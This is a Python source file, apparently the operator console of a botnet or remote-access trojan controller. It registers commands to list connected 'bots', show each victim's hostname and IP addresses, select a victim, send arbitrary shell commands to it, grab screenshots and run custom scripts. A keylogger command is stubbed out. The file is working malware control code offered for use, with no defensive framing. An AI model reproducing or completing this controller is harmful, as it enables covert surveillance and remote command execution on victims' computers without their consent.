from typing import TYPE_CHECKING, Callable, Optional
from time import sleep as time_sleep
from loguru import logger
from os import listdir

if TYPE_CHECKING:
    from .bucket import ConnectionBucket
    from sock import NetterServer

class Command:
    _registry: dict[str, list] = dict()
    instance: Optional['CommandHandler'] = None

    def __init__(self, connectionBucket: Optional['ConnectionBucket'] = None) -> None:
        self.connectionBucket = connectionBucket

    @classmethod
    def __call__(cls, name: str | list, accept_args: bool = False) -> Callable:

        def wrapper(function: Callable) -> None:
            if (isinstance(name, str)):
                cls._registry[name.lower()] = [function, accept_args]

            else:
                for aliases in name:
                    cls._registry[aliases.lower()] = [function, accept_args]

        return wrapper

    def set_connection_bucket(self, connectionBucket: 'ConnectionBucket') -> None:
        self.connectionBucket = connectionBucket

    def handle_command(self, command: str) -> None:
            function: list | None = self._registry.get((splited := command.split())[0], None)
            commandArgs: list | None = splited if ' ' in command else None

            if not (function):
                self.on_command_not_found(command.split()[0])
                return

            if not commandArgs or not function[1]: function[0](self.instance); return
            function[0](self.instance, *commandArgs[1:])

    def on_command_not_found(self, command_name: str) -> None:
        logger.error('The command "%s" is not found.' % command_name)

class CommandHandler:
    command: Command = Command(None)

    def __init__(self, connectionBucket: 'ConnectionBucket', NetServer: 'NetterServer') -> None:
        self.bucket = connectionBucket
        self.NetServer = NetServer

        self.command.set_connection_bucket(self.bucket)
        self.command.instance = self

    @command(['bot', 'bots'])
    def check_client(self) -> None:
        if not self.bucket.connectionList:
            logger.info('No client is connected at the moment...')
            return

        logger.info('List of connected client currently:')

        for clientDevice in self.bucket.connectionList:
            print(f'  L {clientDevice.hostname} : {clientDevice.clientUniqueID}')

        print()

    @command(['info', 'whois'], accept_args = True)
    def client_info(self, *clientID) -> None:
        selectedClient = self.NetServer._selectedClient if self.NetServer._selectedClient is not None else self.bucket.get_client_by_id(clientID)

        if (selectedClient is None):
            logger.error('Client ID not found'); return

        if not clientID:
            logger.error('Missing argumment: Client Unique ID')
            return

        logger.info(f'{selectedClient.hostname}\'s device information:'); \
            print(' L Hostname : %s' % selectedClient.hostname); \
            print(' L Public IP Address : %s' % selectedClient.publib_address); \
            print(' L Local IP Address : %s\n' % selectedClient.local_address)

        logger.info('Additional information:')

        for key, value in selectedClient.additionalData.items():
            print(' L %s : %s' % (key, value))

        print('')

    @command(['select'], accept_args = True)
    def select_client(self, *args) -> None:
        if not args:
            logger.error('Missing argumment: Client Unique ID')
            return

        if not (selectedCli := self.bucket.get_client_by_id(args)):
            logger.error('Client ID not found'); return

        self.NetServer._selectedClient = selectedCli

    @command(['run'], accept_args = True)
    def exec_command(self, *args) -> None:
        if not self.NetServer._selectedClient:
            logger.error('A client has to be selected in order to use this command')
            return

        self.NetServer._selectedClient.socket.send_packet('execute_command ' + ' '.join(args))
        self.NetServer._waitingForResponse = True

        while (self.NetServer._waitingForResponse):
            time_sleep(1)

    @command(['screenshot', 'ss'], accept_args = True)
    def screenshot(self, *clientID) -> None:
        if (self.NetServer._selectedClient):
            self.NetServer._selectedClient.socket.send_packet('request_screenshot')
            logger.info('Waiting for client\'s response')
            self.NetServer._waitingForResponse = True

            while self.NetServer._waitingForResponse:
                time_sleep(1)

            return

        if not clientID:
            logger.error('Missing argument: Client Unique ID')
            return

        if not (selectedCli := self.bucket.get_client_by_id(clientID)):
            logger.error('Client ID not found'); return

        selectedCli.socket.send_packet('request_screenshot')
        logger.info('Waiting for client\'s response')
        self.NetServer._waitingForResponse = True

        while self.NetServer._waitingForResponse: time_sleep(1)

    @command(['runpy'], accept_args = True)
    def run_script(self, *fileName) -> None:
        if not fileName:
            logger.error('Missing argument: Script files, the file should be in the `custom_script` directory')
            return

        fileList: list[str] = [file for file in listdir('custom_script') if file.endswith('.py')]

        if (fileName[0] not in fileList):
            logger.error('File does not exist. Make sure you put the script inside the `custom_script` directory')
            return

        ...

    @command(['keylogger'], accept_args = True)
    def keylogger(self) -> None:
        ...
